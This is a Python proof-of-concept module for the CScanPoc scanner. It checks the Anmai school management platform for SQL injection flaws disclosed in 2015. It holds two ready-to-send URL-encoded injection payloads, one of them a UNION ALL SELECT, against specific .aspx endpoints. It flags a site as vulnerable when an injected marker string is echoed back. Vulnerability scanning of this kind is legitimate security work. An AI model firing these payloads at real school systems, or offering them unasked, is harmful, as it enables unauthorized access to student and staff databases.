# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Anmai_0001'  # 平台漏洞编号，留空
    name = '安脉学校综合管理平台 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-04-13'  # 漏洞公布时间
    desc = '''
        安脉学校综合管理平台采用B/S结构.NET技术，支持IE/Google/火狐/360等主流浏览器，支持云平台，有多元化的用户群，进行统一身份论证，符合《教育管理信息化标准》的要求。
        安脉学校综合管理平台页面参数过滤不完整，导致SQL注入漏洞：
        /anmai/SF_Manage/tfdeleN.aspx?tfid=%28
        /anmai/RecruitstuManage/hiddenValue.aspx?topicid=1
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0106717https://bugs.shuimugan.com/bug/view?bug_no=0106896'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '安脉学校综合管理平台'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f984d276-cbef-4cab-a923-32f770fe9af0'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # ref wooyun-2015-0106717
            # ref wooyun-2015-0106896
            payloads = [
                '/anmai/SF_Manage/tfdeleN.aspx?tfid=%28SELECT%20%20CHAR%28113%29%2bCHAR%28122%29%2bCHAR%28112%29%2bCHAR%28122%29%2bCHAR%28113%29%2bCHAR%28120%29%2bCHAR%2878%29%2bCHAR%2882%29%2bCHAR%2879%29%2bCHAR%2875%29%2bCHAR%28100%29%2bCHAR%2884%29%2bCHAR%2889%29%2bCHAR%28105%29%2bCHAR%28107%29%2bCHAR%28113%29%2bCHAR%28120%29%2bCHAR%28122%29%2bCHAR%28112%29%2bCHAR%28113%29%20%29',
                '/anmai/RecruitstuManage/hiddenValue.aspx?topicid=1%27%20UNION%20ALL%20SELECT%20null%2CCHAR%28113%29%2bCHAR%28122%29%2bCHAR%28112%29%2bCHAR%28122%29%2bCHAR%28113%29%2bCHAR%28120%29%2bCHAR%2878%29%2bCHAR%2882%29%2bCHAR%2879%29%2bCHAR%2875%29%2bCHAR%28100%29%2bCHAR%2884%29%2bCHAR%2889%29%2bCHAR%28105%29%2bCHAR%28107%29%2bCHAR%28113%29%2bCHAR%28120%29%2bCHAR%28122%29%2bCHAR%28112%29%2bCHAR%28113%29--'
            ]
            for payload in payloads:
                verify_url = self.target + payload
                #code, head,res, errcode, _ = curl.curl2(url)
                r = requests.get(verify_url)
                if r.status_code == 200 and 'qzpzqxNROKdTYikqxzpq' in r.text:
                    # security_hole(url)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
